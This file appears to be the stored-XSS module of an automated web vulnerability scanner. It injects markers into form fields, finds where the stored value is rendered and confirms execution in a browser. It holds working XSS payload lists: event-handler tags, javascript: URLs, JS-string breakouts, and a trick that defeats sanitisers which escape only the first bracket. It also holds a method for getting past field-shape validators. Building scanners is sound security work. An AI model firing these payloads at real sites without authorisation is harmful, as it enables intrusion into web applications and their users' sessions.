"""Stored XSS: server-side (POST→GET) and client-side (browser form store).

Every payload embeds a unique marker so browser confirmation is *causal*: the
dialog has to announce the token we injected, not merely "some dialog fired".
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import time
from typing import List, Optional
from urllib.parse import urljoin, urlparse

from intellixss.analysis.context import analyze_marker
from intellixss.analysis.reflection import is_payload_effective
from intellixss.analysis.static_dom import store_roundtrip_flows
from intellixss.analysis.urlshape import URL_SHAPE, field_attr, wants_url
from intellixss.http.client import HttpClient
from intellixss.models import InjectionContext, XSSFinding
from intellixss.payloads.generator import make_marker
from intellixss.verify.check import evaluate_response

# Payload templates (PO → alert('marker')), ordered by observed reliability when
# the value is concatenated into markup that the page may leave partially
# unclosed. ``<svg/onload>`` is SVG content: inside a mis-nested container the
# parser can fold it into a comment, so it goes after the event-handler probes.
STORED_TEMPLATES = [
    "<img src=x onerror=PO>",
    "<details open ontoggle=PO>",
    "<svg/onload=PO>",
    "<body onpageshow=PO>",
    "<iframe srcdoc=\"<script>PO</script>\">",
]

# Wall clock for one browser-driven store probe. The individual steps are
# bounded, but a page that keeps a socket open can hold the sequence anyway;
# the scan as a whole must never hang on a single page.
_STORE_PROBE_SECONDS = 45.0

# Wall clock for a whole stored stage. A stored pass is a side quest — the
# reflected scan is what the user ordered — so a page that makes it overrun is
# reported and skipped rather than allowed to consume the scan.
_STORE_STAGE_SECONDS = 120.0


async def _bounded(coro, seconds: float, log, label: str) -> List[XSSFinding]:
    """Await *coro* with a deadline, returning no findings when it overruns."""
    try:
        return await asyncio.wait_for(coro, timeout=seconds)
    except asyncio.TimeoutError:
        log(f"{label}: stage exceeded {seconds:.0f}s — skipped", "warn")
        return []
    except Exception as e:  # a plugin failure must not take the scan down
        log(f"{label}: stage failed — {e}", "warn")
        return []


def _first_occurrence_sanitizer(js: str) -> bool:
    """True when the page's escaping replaces only the *first* bracket.

    ``html.replace('<', '&lt;').replace('>', '&gt;')`` is a common sanitising
    idiom that is only correct for a single occurrence: everything after the
    first pair is still markup. Recognising it is not a guess about the app —
    the statement is in the page, and a payload that leads with a harmless
    ``<>`` spends both replacements and leaves the rest live.
    """
    if not js:
        return False
    first_replace = len(re.findall(r"""\.replace\s*\(\s*['"]<['"]""", js)) > 0
    second_replace = len(re.findall(r"""\.replace\s*\(\s*['"]>['"]""", js)) > 0
    if not (first_replace and second_replace):
        return False
    # ``replaceAll`` / a global regex / a loop would handle every occurrence,
    # and then a leading pair buys nothing.
    return not re.search(r"replaceAll|/[<>]/g|while\s*\(", js)

# Legacy plain-text list kept for callers/tests that assert on template shape.
STORED_PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<svg onload=alert(1)>",
    "<body onpageshow=alert(1)>",
]

# Heuristic field names for stored content
STORE_FIELDS = [
    "content",
    "message",
    "comment",
    "body",
    "text",
    "post",
    "description",
    "bio",
    "title",
    "name",
]


def _build_payloads(
    marker: str,
    limit: int,
    context: Optional[InjectionContext] = None,
    page_js: str = "",
) -> List[str]:
    """Payloads for a stored field, ordered for the sink that renders it.

    A form field is not a sink. The value is rendered wherever the page puts
    it — headline, comment body, but very often a link: a "website" field is
    echoed into ``<a href="…">``. There the angle-bracket templates are inert
    and a URL scheme is what executes, so the bank follows the rendering
    context rather than the field's presumed nature.

    When the page's own script escapes only the first ``<`` and ``>``, a
    leading ``<>`` is prepended: it absorbs both replacements, so the real
    element behind it is parsed intact. This is read from the page, not assumed.
    """
    a = f"alert('{marker}')"
    if context == InjectionContext.HTML_ATTR_HREF:
        return [
            f"javascript:{a}",
            f"javascript:{a}//",
            f'javascript:{a} target=x',
            f"data:text/html,<script>{a}</script>",
        ][:limit]
    if context in (
        InjectionContext.JS_IN_ATTR,
        InjectionContext.JS_STRING_SINGLE,
        InjectionContext.JS_STRING_DOUBLE,
    ):
        return _js_breakouts(a, marker)[:limit]
    lead = "<>" if _first_occurrence_sanitizer(page_js) else ""
    out = []
    for t in STORED_TEMPLATES[:limit]:
        out.append(lead + t.replace("PO", a))
    return out


def _js_breakouts(a: str, marker: str) -> List[str]:
    """Payloads for a stored value that lands inside a JavaScript string.

    A "website" field is echoed into ``tracker.track('…')`` inside an onclick
    handler. The field usually validates its own shape, so the value has to be
    link-like; the handler's delimiters are what have to be broken. Two families
    are offered because which one works depends on how the page escapes the
    apostrophe:

    * the page backslash-escapes it, so the entity spelling arrives after the
      escaper has run and is decoded back into a bare quote by the parser —
      measured, with ``&apos;`` surviving where ``&#39;`` is dropped;
    * the page does not escape it at all, and the raw quote already closes the
      literal.

    A plain ``-alert(...)`` joins the survivors: subtracting from the next term
    keeps the expression valid where the page leaves the literal open.

    A handler that opens a *block* (``{track(){}};tracker.track('…')``) is the
    common shape: the value closes the call's own parenthesis as well as the
    string, and executes before the call is entered. That form leads the list
    because it is the one an app with this handler actually reaches.
    """
    quoted = f"alert('{marker}')"
    ticked = f"alert(`{marker}`)"
    return [
        f"http://x&apos;);{ticked};//",
        f"http://x&apos;)-{ticked};//",
        f"http://x';{ticked};//",
        f"http://x');{ticked};//",
        f"http://x'-{ticked};//",
        f"http://x&apos;;{ticked};//",
        f"http://x&apos;-{ticked}-&apos;",
        f"http://x'-{ticked}-'",
        f"http://x&apos;+{ticked}+&apos;",
        f"http://x';{quoted};//",
    ]


def _is_redirect(status: int) -> bool:
    return status in (301, 302, 303, 307, 308)


def _action_of(form_html: str) -> str:
    """The ``action`` a form declares, or ``""`` when it posts to itself."""
    if not form_html:
        return ""
    m = re.search(r"<form\b[^>]*\baction\s*=\s*[\"']([^\"']*)", form_html, re.I)
    return m.group(1) if m else ""


def _handler_is_form_page(form_html: str, form_page: str) -> bool:
    """Whether the form posts back to the page that carries it.

    ``action="/post?postId=7"`` on ``/post?postId=7`` posts the record to the
    very document that displays it; the handler's own response then already
    contains the stored value. An action naming another path (``/post/comment``)
    is a separate endpoint whose response is not the record's page.
    """
    action = _action_of(form_html)
    if not form_page:
        return False
    if not action or action.startswith("#"):
        return True
    return urljoin(form_page, action).split("?")[0] == form_page.split("?")[0]


def _is_confirmation(url: str) -> bool:
    """A handler's own "submitted" screen: it can never carry the record."""
    return "confirmation" in (url or "").lower()


async def _submit(
    client: HttpClient,
    form_url: str,
    field: str,
    value: str,
    method: str,
    data: dict,
    *,
    wrap: str = "",
):
    """Submit a field's value, keeping it reachable past a shape validator.

    A field with its own validator (a "Website" input) rejects the *shape* of a
    bare payload with ``400`` while happily storing a link. Re-sending the same
    value inside a URL keeps it verbatim for the sink behind the check, so a
    validated field is still tested instead of being written off as unreachable.

    *wrap* is the template that carries the value past that check, read from the
    form's own markup by the caller. When it is empty no validator was declared
    and the value is sent bare.
    """
    st, body, hdrs, fin = await client.inject(
        form_url, field, value, method=method, base_data=data
    )
    # A stored value is accepted and then rendered *elsewhere*. Many handlers
    # answer a successful write with ``303`` to a "submitted" page that carries
    # no record at all; following it hides the fact that the value was stored,
    # and the caller writes the field off because the follow-up page has no
    # echo. Storage is decided by the status the handler itself returns.
    if _is_redirect(st) and st < 400:
        return st, body, hdrs, fin
    if st < 400 or "://" in value or not wrap:
        return st, body, hdrs, fin
    if method.upper() != "POST":
        # The shape check is applied by the handler, and only a submission
        # reaches it; a GET carries the value straight to the page.
        return st, body, hdrs, fin
    wrapped = wrap.format(value=value)
    st2, body2, hdrs2, fin2 = await client.inject(
        form_url, field, wrapped, method=method, base_data={**data, field: wrapped}
    )
    # The retry's verdict is the field's verdict: reporting the first 400 when
    # the wrapped value was accepted makes the caller abandon a field it just
    # proved it could write to.
    if st2:
        return st2, body2, hdrs2, fin2
    return st, body, hdrs, fin


async def scan_server_stored(
    client: HttpClient,
    form_url: str,
    *,
    field: str,
    method: str = "POST",
    base_data: Optional[dict] = None,
    render_urls: Optional[List[str]] = None,
    browser=None,
    max_payloads: int = 6,
    log=None,
) -> List[XSSFinding]:
    """
    Classic stored XSS:

      1. inject a canary into the form field (POST/GET)
      2. re-fetch render URL(s) — does it persist?
      3. inject payloads and check for executable reflection + browser confirm
    """
    log = log or (lambda *a, **k: None)
    findings: List[XSSFinding] = []
    render_urls = render_urls or [form_url]
    data = dict(base_data or {})
    uid = hashlib.md5(f"{field}{time.time()}".encode()).hexdigest()[:8]

    # The form is fetched once, and it answers two questions the handler cannot:
    # whether the write is *located elsewhere* (an action endpoint that renders
    # a "submitted" page, with the record shown back on the page that carries
    # the form), and whether this field only accepts a link-shaped value.
    #
    # The handler URL is usually not the page: ``/post/comment`` answers with a
    # confirmation screen while the form itself sits on ``/post?postId=1``. The
    # page is searched for the field's declaration first and the handler second,
    # so a field that validates its own shape is recognised wherever its markup
    # is actually served.
    field_html = ""
    form_html = ""
    for probe in [p for p in render_urls if p] + [form_url]:
        try:
            _fs, html, _fh, _ff = await client.request("GET", probe)
        except Exception:
            continue
        found = field_attr(html, field)
        if found:
            field_html, form_html = found, html
            break
        if not form_html:
            form_html = html
    wrap = URL_SHAPE if wants_url(field_html) else ""

    # A field that only accepts a link is still tested with the record inside
    # it, not in front of it: the link the form demands *is* the payload's own
    # URL (``http://x…``), and the wrapper is only a fallback for values that
    # carry no scheme of their own. Prefixing every payload would put the sink
    # at ``http://ixv.example/http://x…`` and change the only part the field
    # validator actually looks at.
    def _send(value: str):
        carries_own_scheme = value.startswith(("http://", "https://", "//"))
        return _submit(
            client,
            form_url,
            field,
            value,
            method,
            data,
            wrap="" if carries_own_scheme else wrap,
        )

    # 1) Canary — does storage persist?
    canary = f"ixc{uid}"
    data[field] = canary
    st, body, _, fin = await _send(canary)
    if st == 0:
        return findings
    if st >= 400 and method.upper() == "POST":
        log(f"stored: POST {st} on {form_url[:60]} — skipping", "debug")
        return findings

    stored = False
    render_body = ""
    render_candidates = list(render_urls)
    page_scripts: List[str] = []
    render_page = render_urls[0] if render_urls else form_url
    # The endpoint list has to come from the *page* that posts the form, not
    # from the handler it posts to: the handler is a bare endpoint and the
    # script that names its JSON sibling lives on the page.
    page_for_scripts = form_url
    page_body_for_endpoints = body or ""
    if body and "POST" in (method or "").upper():
        page_for_scripts = render_urls[0] if render_urls else form_url
        if page_for_scripts != form_url:
            _st, page_body_for_endpoints, _h, _f = await client.request(
                "GET", page_for_scripts
            )
    # A form whose ``action`` points at its own page posts *to* the page that
    # renders the record, so a successful write is readable straight from the
    # handler's response. That is only true when the handler did not hand off to
    # another document: a ``303`` to a "submitted" page means the write really
    # happened and the record has to be looked for on the page the form came
    # from, which the candidate list already holds.
    posted_in_place = method.upper() == "POST" and _handler_is_form_page(
        form_html, page_for_scripts
    )
    if not posted_in_place and render_urls:
        # Do not spend a request re-reading a follow-up page that provably
        # carries no record.
        render_candidates = [c for c in render_candidates if not _is_confirmation(c)]
    render_candidates.extend(
        await _render_endpoints(
            client,
            page_for_scripts,
            page_body_for_endpoints or "",
            sources_out=page_scripts,
        )
    )
    covered = set()
    for candidate in render_candidates:
        if candidate in covered:
            continue
        st_r, body_r, _hdrs = await _render_one(client, candidate)
        if not _renders_records(st_r, body_r):
            # A handler verdict, not a page: reading it says nothing about
            # storage, so it is skipped rather than counted as a failed render.
            continue
        if canary in body_r:
            stored = True
            render_body = body_r
            # The endpoint that returned the record is where the payload has to
            # be looked for again once it is stored.
            render_urls = [candidate]
            # The endpoint can be the JSON the page fetches rather than the
            # page itself. A browser cannot execute JSON, so confirmation has to
            # open the document that consumes it. A candidate that *is* that
            # document is already the page to open — replacing it with the form
            # page would send the browser to the handler URL instead.
            render_page = (
                candidate
                if candidate == page_for_scripts or _is_document(candidate)
                else page_for_scripts
            )
            break
    if not stored and body and canary in body:
        stored = True
        render_body = body
        render_urls = [fin or form_url]

    if not stored:
        log(f"stored: canary not persisted for field={field}", "debug")
        return findings

    log(f"stored: server persistence OK field={field}", "info")

    # The sink the canary landed in decides which payload family can execute.
    # ``analyze_marker`` also tells us whether the echo is escaped: an echo
    # that survives only as text is stored-and-encoded, not stored-and-live,
    # and chasing it with markup payloads only produces false positives.
    sink = None
    sinks: List[InjectionContext] = []
    if render_body:
        # A JSON endpoint body embeds the record in a string; markup is still
        # parsed when the page assigns it, so the record's own value is what has
        # to be classified. ``raw`` is the substring around the canary with the
        # JSON wrapper removed, which is what the page will hand to ``innerHTML``.
        analyzed = _json_value_context(render_body, canary) or render_body
        probe_hit = analyze_marker(analyzed, canary)
        if probe_hit.encoded:
            log(
                f"stored: canary echoed but escaped field={field} "
                f"({probe_hit.context.value}) — not a live sink",
                "debug",
            )
            return findings
        sink = probe_hit.context
        # The same stored value is often rendered in more than one place: a
        # "website" field reaches both the author link's ``href`` and the
        # ``track('…')`` call in its ``onclick``. The first occurrence is only
        # one of them, and a payload built for the wrong one is inert — a
        # ``javascript:`` URL in an ``href`` proves nothing about the handler.
        # Every distinct context the canary lands in gets its own payload family.
        sinks = _sink_contexts(analyzed, canary, sink)
    log(
        f"stored: sink context "
        f"{','.join(s.value for s in sinks) or 'unknown'} field={field}",
        "debug",
    )

    marker = make_marker(uid)
    page_js = "\n".join(page_scripts) or page_body_for_endpoints or body or ""
    payloads: List[str] = []
    for sk in sinks or [sink or InjectionContext.HTML_TEXT]:
        for p in _build_payloads(marker, max_payloads, sk, page_js=page_js):
            if p not in payloads:
                payloads.append(p)
    payloads = payloads[:max(max_payloads, 4) * max(1, len(sinks))]
    for payload in payloads:
        data[field] = payload
        st2, body2, _, fin2 = await _send(payload)
        if st2 == 0:
            continue
        for ru in render_urls:
            st_r, body_r, hdrs_r = await _render_one(client, ru)
            if not st_r or not body_r:
                continue
            # The stored value is rendered wherever the page puts it, which is
            # rarely the text node a form field suggests: a "website" field
            # ends up inside ``<a href="…">``. Classify the real reflection
            # instead of assuming HTML text, or every attribute sink is judged
            # with the wrong predicate and dropped.
            #
            # When the endpoint returns JSON, the record is a string the page
            # concatenates into markup; the string's content is what reaches the
            # parser, so that is what gets classified.
            scanned = _json_value_context(body_r, marker) or body_r
            hit = analyze_marker(scanned, marker)
            ctx_kind = hit.context
            # A stored value is not spliced *into* an existing attribute — it is
            # placed where the page chooses to put the record. If the page then
            # rebuilds markup from it, the value arrives whole, so an element the
            # payload opens is still a real element. Reading the classified
            # context alone would see the ``onerror`` inside the payload and
            # conclude "we are in a handler", which is a statement about the
            # payload's own text, not about where the page puts it.
            if scanned is not body_r and _opens_a_complete_element(payload):
                ctx_kind = InjectionContext.HTML_TEXT
            out = evaluate_response(
                url=ru,
                param=field,
                method=method,
                payload=payload,
                status=st_r,
                body=scanned,
                headers=hdrs_r,
                context=ctx_kind,
            )
            finding: Optional[XSSFinding] = None
            if out.success and out.finding:
                finding = out.finding
                finding.vulnerability_type = "stored"
                finding.method = method
            else:
                # The payload was built for one of the contexts the canary was
                # rendered into; that is the context it has to be judged in. The
                # first echo on the page may be a different one (an ``href``
                # ahead of the ``onclick``), and judging a handler breakout by
                # the URL predicate rejects the only payload that can run.
                ok, tag = False, ""
                for sk in sinks or [ctx_kind]:
                    ok, tag = is_payload_effective(scanned, payload, sk.value)
                    if ok:
                        ctx_kind = sk
                        break
                if not ok:
                    continue
                finding = XSSFinding(
                    url=ru,
                    parameter=field,
                    method=method,
                    context=ctx_kind,
                    payload=payload,
                    evidence=f"server_stored:{tag}",
                    vulnerability_type="stored",
                    confidence=0.85,
                )
            finding.marker = marker
            finding.verified_by = "reflection"

            if (
                browser
                and getattr(browser, "available", False)
                # A payload that cannot run cannot be *shown* not to run: the
                # reflection evidence already says the record is inert, and a
                # page of inert records costs a browser navigation that the
                # host's confirmation budget has to pay for. Only a lead the
                # echo predicate accepted is worth driving through Chromium.
            ):
                # A record written to a handler endpoint is rendered the next
                # time the *article* is opened, not on the response that stored
                # it — the confirmation URL usually says "submitted" and carries
                # no record at all. Navigating to the render page asks for the
                # stored payload the way a victim would.
                #
                # The confirmer bounds itself internally, but only once it has
                # started: a browser that is wedged before it can answer never
                # returns, and the caller waits forever. The wait here is the
                # backstop, and it is what keeps a stuck page from freezing the
                # whole scan.
                try:
                    br = await asyncio.wait_for(
                        browser.confirm(
                            render_page,
                            context_hint=ctx_kind.value,
                            payload=payload,
                            marker=marker,
                        ),
                        timeout=_STORE_PROBE_SECONDS + 15,
                    )
                    if not br.confirmed and getattr(br, "detail", "") in (
                        "no_execution_observed",
                        "markup_no_execution",
                    ):
                        # The record is not in the served document: the page
                        # fetches it and writes it into the DOM after load, so a
                        # pure navigation has nothing to show. Handing the same
                        # payload to the document as its own content reproduces
                        # that write, which is what makes the payload run.
                        br = await asyncio.wait_for(
                            browser.confirm_markup(
                                render_page, markup=payload, marker=marker
                            ),
                            timeout=_STORE_PROBE_SECONDS + 15,
                        )
                except asyncio.TimeoutError:
                    log(f"stored: confirm stalled field={field}", "debug")
                    findings.append(finding)
                    return findings
                log(f"stored: browser confirm {br.detail} field={field}", "debug")
                if br.confirmed:
                    finding.browser_confirmed = True
                    finding.verified_by = "browser"
                    finding.trigger = br.trigger
                    finding.confidence = 0.97 if br.marker_echoed else 0.85
                    finding.evidence += f" | browser:{br.detail}"
                    # The rendered document is what a victim opens; the JSON
                    # endpoint only exists to feed it.
                    if render_page and render_page != finding.url:
                        finding.url = render_page

            findings.append(finding)
            log(
                f"VULN stored XSS field={field} browser={finding.browser_confirmed}",
                "vuln",
            )
            return findings
    return findings


async def _render(client: HttpClient, urls: List[str]):
    for u in urls:
        st, body, _ = await _render_one(client, u)
        yield st, body


def _stored_render_url(render_urls: List[str], render_page: str) -> str:
    """The article URL that shows the stored record, for the browser to open.

    ``render_urls`` is ranked by the order the record was found in, which is
    often a JSON sibling the page fetches — a browser cannot execute that. The
    document that consumes it (``render_page``) is the one a victim opens, so
    it is preferred and only falls back to the first URL that is a document.
    """
    if render_page:
        return render_page
    for u in render_urls:
        if "?" in u and "json" not in u.lower():
            return u
    return render_urls[0] if render_urls else ""


async def _render_one(client: HttpClient, url: str):
    st, body, hdrs, _ = await client.request("GET", url)
    return st, body, hdrs


# A handler that answers with a short *sentence* wrote no record: a page that
# renders one is a document with markup in it. The distinction matters because
# an authentication guard, a validation error or a "thanks" screen all answer
# 2xx and would otherwise be re-read as if they were the record's page.
_BARE_TEXT_RE = re.compile(r"^\s*(?:[\"']?[^<>\n]{0,80}[\"']?\s*)$")


def _renders_records(st: int, body: str) -> bool:
    """Whether a response is a *page* that could carry a stored value.

    ``True`` for a document with at least one tag. A short plain-text answer (a
    JSON string, an error sentence, an empty body) is a handler verdict, not a
    render page, and re-reading it for a canary is a wasted request that also
    hides the real sink behind a false "not persisted".
    """
    if st == 0 or not body:
        return False
    if body.lstrip().startswith("<"):
        return True
    return not _BARE_TEXT_RE.match(body[:200])


async def scan_client_stored(
    browser,
    page_url: str,
    *,
    payloads: Optional[List[str]] = None,
    log=None,
) -> List[XSSFinding]:
    """
    Client-side stored XSS via browser (localStorage / in-page JS store):
    fill form → submit → dialog on render.
    """
    log = log or (lambda *a, **k: None)
    findings: List[XSSFinding] = []
    if not browser or not getattr(browser, "available", False):
        log("stored-client: browser required — skip", "warn")
        return findings

    uid = hashlib.md5(f"{page_url}{time.time()}".encode()).hexdigest()[:8]
    marker = make_marker(uid)
    candidates = payloads or _build_payloads(marker, 5)

    for payload in candidates[:5]:
        log(f"stored-client: try payload={payload[:48]!r}", "debug")
        # The store probe navigates and fills a form; a page that stalls holds
        # the whole scan behind it, so each attempt carries its own deadline.
        try:
            br = await asyncio.wait_for(
                browser.confirm_client_stored(
                    page_url, payload=payload, marker=marker
                ),
                timeout=_STORE_PROBE_SECONDS,
            )
        except asyncio.TimeoutError:
            log("stored-client: probe timed out", "debug")
            continue
        if not br.confirmed:
            continue
        findings.append(
            XSSFinding(
                url=page_url,
                parameter="content",
                method="CLIENT",
                context=InjectionContext.HTML_TEXT,
                payload=payload,
                evidence=(
                    f"client_stored_form -> {br.detail}"
                    + (f":{br.dialog_message}" if br.dialog_message else "")
                ),
                browser_confirmed=True,
                verified_by="browser",
                trigger=br.trigger,
                marker=marker,
                impact="high",
                vulnerability_type="stored_client",
                confidence=0.97 if br.marker_echoed else 0.85,
            )
        )
        log(
            f"VULN client-stored XSS payload={payload[:40]!r} ({br.detail})",
            "vuln",
        )
        return findings
    return findings


async def scan_stored_auto(
    client: HttpClient,
    seed_url: str,
    *,
    browser=None,
    targets: Optional[list] = None,
    log=None,
) -> List[XSSFinding]:
    """
    Auto stored-XSS pass:
    - client-side form pages (browser path) on the seed
    - store round-trip pages (localStorage → innerHTML) whose frame is analysed
    - server POST forms with store-like field names
    """
    log = log or (lambda *a, **k: None)
    findings: List[XSSFinding] = []

    # 0) Static store round-trip (localStorage → concatenated innerHTML).
    #    The frame path is derived from the seed because portals often serve
    #    the actual app under /frame while the top page is a wrapper.
    #
    # The browser-driven probes already have individual deadlines, but the
    # static analysis in front of them parses the page's scripts and can take
    # arbitrarily long on a script it cannot fold. Each stage therefore runs
    # under its own wall clock, and a stage that overruns is reported and
    # skipped instead of stalling the scan that is waiting on it.
    render_url = await _bounded(
        _store_render_url(client, seed_url, log=log), _STORE_STAGE_SECONDS,
        log, "store render-url",
    )
    if render_url and browser and getattr(browser, "available", False):
        cf = await _bounded(
            scan_store_roundtrip(browser, render_url, log=log),
            _STORE_STAGE_SECONDS, log, "store round-trip",
        )
        findings.extend(cf)
        if cf:
            return findings

    # 1) Client-side on the seed (unique URL, no guessing other paths)
    if browser and getattr(browser, "available", False):
        cf = await _bounded(
            scan_client_stored(browser, seed_url, log=log),
            _STORE_STAGE_SECONDS, log, "client-stored",
        )
        findings.extend(cf)
        if cf:
            return findings

    # 2) Server-side from discovered POST targets
    for t in targets or []:
        if str(getattr(t, "method", "GET")).upper() != "POST":
            continue
        params = getattr(t, "params", []) or []
        data = dict(getattr(t, "data", {}) or {})
        url = getattr(t, "url", seed_url)
        for field in params:
            if field.lower() not in STORE_FIELDS:
                continue
            sf = await scan_server_stored(
                client,
                url,
                field=field,
                method="POST",
                base_data=data,
                render_urls=[url, seed_url],
                browser=browser,
                log=log,
            )
            findings.extend(sf)
            if sf:
                return findings

    return findings


def _sink_contexts(body: str, canary: str, first) -> List[InjectionContext]:
    """Every distinct context the stored value is rendered into.

    ``analyze_marker`` answers "where is the most promising echo", which is the
    right question for a reflected parameter and the wrong one for a stored
    record: the same value is written into several places at once, and the
    page does not pick the friendliest. A "website" field lands in the author
    link's ``href`` *and* inside ``track('…')`` in its ``onclick``; a payload
    built for one of those is silent against the other. Each position is
    classified and the executable families are offered together.
    """
    out: List[InjectionContext] = []
    if first is not None:
        out.append(first)
    for start in [m for m in _find_all(body, canary)][:8]:
        hit = _analyze_at_offset(body, canary, start)
        if hit and hit not in out:
            out.append(hit)
    # A URL attribute is the least likely of the group to fire on its own: a
    # link is only followed when clicked, while a handler on the same element
    # already runs for the click. Keep it, but let the others lead.
    out.sort(key=lambda c: c == InjectionContext.HTML_ATTR_HREF)
    return out


def _find_all(body: str, needle: str) -> List[int]:
    positions: List[int] = []
    start = 0
    low_body, low_needle = (body or "").lower(), (needle or "").lower()
    while needle and len(positions) < 8:
        i = low_body.find(low_needle, start)
        if i < 0:
            break
        positions.append(i)
        start = i + len(needle)
    return positions


def _analyze_at_offset(body: str, canary: str, start: int):
    from intellixss.analysis.context import _analyze_at

    try:
        return _analyze_at(body, canary, start, start + len(canary)).context
    except Exception:
        return None


def _opens_a_complete_element(payload: str) -> bool:
    """True when *payload* contains a whole element, not a fragment of one.

    ``<img src=x onerror=…>`` opens and closes a tag by itself: wherever the
    page places the value, the parser sees a complete element with a handler.
    A fragment such as ``onerror=alert(1)`` or ``1' onerror=…`` only means
    something inside markup the page already opened, so it is not treated this
    way and keeps the classified context.
    """
    return bool(
        re.search(r"""<[A-Za-z][\w:-]*\b[^<>]*?["']?\s*/?>""", payload or "")
    ) and ">" in (payload or "")


def _json_value_context(body: str, canary: str) -> Optional[str]:
    """Return the JSON string value holding *canary*, unescaped, if any.

    A stored record served as JSON reaches the DOM as a *string* the page
    concatenates into markup, so the string's own content — not the document
    that carries it — is what decides whether the markup is live or printed.
    Parsing beats slicing here: the transport escapes quotes and backslashes,
    and the page decodes them again before the value reaches the sink.
    """
    if canary not in (body or ""):
        return None
    try:
        import json

        parsed = json.loads(body)
    except Exception:
        return None

    found: List[str] = []

    def _walk(node) -> None:
        if isinstance(node, str):
            if canary in node:
                found.append(node)
        elif isinstance(node, dict):
            for value in node.values():
                _walk(value)
        elif isinstance(node, list):
            for value in node:
                _walk(value)

    _walk(parsed)
    return found[0] if found else None


def _is_document(url: str) -> bool:
    """Whether a render candidate is an HTML document a browser can execute.

    The render endpoint list mixes the page itself with the JSON/XML siblings
    its script fetches. Only a document can run a payload, so only a document
    can be handed to the confirmer as the page to open.
    """
    path = url.split("?", 1)[0].lower()
    if path.endswith((".json", ".xml", ".txt", ".csv")):
        return False
    return "/json" not in path and not path.endswith("/api")


async def _render_endpoints(
    client: HttpClient,
    page_url: str,
    page_body: str,
    *,
    sources_out: Optional[List[str]] = None,
) -> List[str]:
    """Endpoints the page's own script requests, which may render stored data.

    A comment thread is loaded by script, not by the HTML: the document is a
    shell and the server hands the records back as JSON from ``/post/comment``.
    Re-fetching the document alone then looks like "the canary did not persist"
    on a page that persisted it perfectly. Both forms are read — a literal
    ``loadComments('/post/comment')`` call and the ``xhr.open('GET', path +
    location.search)`` the callee performs — and each is combined with the query
    the page actually carries so the JSON comes back for the right record.

    *sources_out*, when given, receives the page body plus every external script
    fetched: the same bodies decide how the page escapes the stored value.
    """
    query = ""
    if "?" in page_url:
        query = "?" + page_url.split("?", 1)[1].split("#", 1)[0]
    endpoints: List[str] = []
    sources: List[str] = [page_body or ""]
    for m in re.finditer(
        r"""<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["']""", page_body or "", re.I
    ):
        src = urljoin(page_url, m.group(1))
        if urlparse(src).netloc != urlparse(page_url).netloc:
            continue
        try:
            st, js, _h, _f = await client.request("GET", src)
        except Exception:
            continue
        if st and js:
            sources.append(js)
    if sources_out is not None:
        sources_out.extend(sources)

    for text in sources:
        # ``loadComments('/post/comment')``: a call whose argument is a literal
        # path — the callee is what builds the request.
        for m in re.finditer(r"""\(\s*['"](/[^'"\s]*)['"]\s*\)""", text):
            path = m.group(1)
            endpoints.append(urljoin(page_url, path) + query)
        # ``xhr.open('GET', '/api/…' + …)``: a URL literal inside the request.
        for m in re.finditer(r"""\.open\s*\(\s*['"]\w+['"]\s*,\s*['"]([^'"]+)""", text):
            endpoints.append(urljoin(page_url, m.group(1)) + query)

    out: List[str] = []
    seen: set = set()
    for url in endpoints:
        if url in seen or url == page_url:
            continue
        seen.add(url)
        out.append(url)
    return out[:4]


async def _store_render_url(
    client: HttpClient, seed_url: str, *, log=None
) -> Optional[str]:
    """Find the page that actually renders a browser-store round-trip.

    Portals serve a wrapper on the seed and the real application under
    ``/frame``; only the frame's script contains the store → ``innerHTML``
    flow. Returns the first URL whose markup shows such a flow.
    """
    log = log or (lambda *a, **k: None)
    base = seed_url.rstrip("/")
    candidates = [f"{base}/frame", seed_url]
    for url in candidates:
        st, body, _h, _ = await client.request("GET", url)
        if not st or not body:
            continue
        if store_roundtrip_flows(body):
            log(f"stored: store round-trip page found {url}", "debug")
            return url
    return None


async def scan_store_roundtrip(browser, page_url: str, *, log=None) -> List[XSSFinding]:
    """Stored XSS through a client-side store (localStorage → innerHTML).

    The user content is persisted by the page's own store, so the payload is
    a plain HTML fragment — no attribute breakout is needed.
    """
    log = log or (lambda *a, **k: None)
    findings: List[XSSFinding] = []
    if not browser or not getattr(browser, "available", False):
        return findings

    marker = make_marker(hashlib.md5(f"{page_url}{time.time()}".encode()).hexdigest()[:8])
    templates = [
        f"<img src=x onerror=alert('{marker}')>",
        f"<details open ontoggle=alert('{marker}')>",
        f"<svg/onload=alert('{marker}')>",
    ]
    seen_fields = set()
    for template in templates:
        # Every navigation below is individually bounded, but a page that keeps
        # a request open (a hanging sub-resource, a redirect loop the browser
        # retries) can still hold the whole probe. The scan itself must not be
        # able to hang on one page, so the probe has a wall clock.
        try:
            br = await asyncio.wait_for(
                browser.confirm_client_stored(
                    page_url, payload=template, marker=marker
                ),
                timeout=_STORE_PROBE_SECONDS,
            )
        except asyncio.TimeoutError:
            log("stored-roundtrip: probe timed out", "debug")
            continue
        log(f"stored-roundtrip: {template[:40]!r} -> {br.detail}", "debug")
        if not br.confirmed:
            continue
        findings.append(
            XSSFinding(
                url=page_url,
                parameter="content",
                method="CLIENT",
                context=InjectionContext.HTML_TEXT,
                payload=template,
                evidence=(
                    f"store round-trip -> {br.detail}"
                    + (f":{br.dialog_message}" if br.dialog_message else "")
                ),
                browser_confirmed=True,
                verified_by="browser",
                trigger=br.trigger,
                marker=marker,
                impact="high",
                vulnerability_type="stored_client",
                confidence=0.97 if br.marker_echoed else 0.85,
            )
        )
        log(f"VULN store round-trip XSS ({br.detail})", "vuln")
        return findings
    return findings
